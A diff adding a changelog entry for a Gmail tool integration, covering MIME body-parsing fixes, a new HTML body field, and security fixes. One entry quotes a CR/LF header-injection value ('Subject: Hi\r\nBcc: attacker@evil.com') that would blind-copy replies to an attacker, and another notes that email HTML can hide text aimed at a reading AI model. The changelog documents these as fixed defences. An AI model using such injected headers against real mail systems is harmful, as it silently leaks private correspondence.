@@ -5,6 +5,55 @@ All notable changes to this project are documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.2.0] - 2026-08-31
+
+### Added
+
+- **`GmailMessage.bodyHtml`**: `gmail_get_message` and `gmail_get_thread` now
+  return the message's `text/html` part alongside the plain-text `body`. List
+  and search results carry no HTML in either field - one full HTML document per
+  result would put megabytes of newsletter markup in a single response - so use
+  `snippet` there, or fetch the message.
+
+### Fixed
+
+- **Email bodies nested more than one level deep came back empty.** Any mail
+  with an attachment arrives as `multipart/mixed > multipart/alternative >
+  text/html`; the old scan looked only at the top-level parts, matched the
+  container, and found no body on it. Where it did match, it always returned
+  the plain-text alternative and discarded the HTML.
+- **A whitespace-only plain-text alternative no longer masks the HTML body.**
+  The common newsletter shape - an empty `text/plain` beside the real
+  `text/html` - previously returned the whitespace as the body.
+- **Bodies split across sibling text parts are no longer truncated.** Mail
+  prefixed with an external-sender banner, or split around an inline image,
+  returned only the first segment; all `text/plain` segments are now joined.
+- Single-part messages with a `text/*` type other than `text/plain` or
+  `text/html` (`text/calendar` invites, `text/enriched`) return their content
+  instead of an empty body.
+- Attachments and forwarded `message/rfc822` payloads no longer supply the
+  body, so an attached email's content cannot surface as the outer message's.
+  Containers are still walked, so a body part is never lost with them.
+- MIME types are matched case-insensitively (RFC 2045 5.1) everywhere,
+  including the forwarded-message check.
+- **Header injection in `gmail_send` and `gmail_reply`.** `To`, `Subject`,
+  `Cc` and `Bcc` were interpolated into a raw RFC 822 message without stripping
+  CR/LF. Since `gmail_reply` takes its subject from the message being replied
+  to, an inbound mail with `Subject: Hi\r\nBcc: attacker@evil.com` would
+  silently blind-copy the reply to the attacker.
+
+### Changed
+
+- **`GmailMessage.body` may now contain HTML.** For mail with no usable
+  plain-text part it falls back to the HTML body, where it previously returned
+  `""`. Callers that treated an empty `body` as "no content available" should
+  read `bodyHtml` to tell the two apart: if `bodyHtml` is set and equal to
+  `body`, the body is markup, not plain text. This does not apply to list and
+  search results, which never return HTML.
+- Gmail tool results are now prefixed with a notice marking the email content
+  as untrusted sender-authored data, since HTML bodies can hide text aimed at
+  a reading model.
+
 ## [1.1.0] - 2026-08-31
 
 ### Added
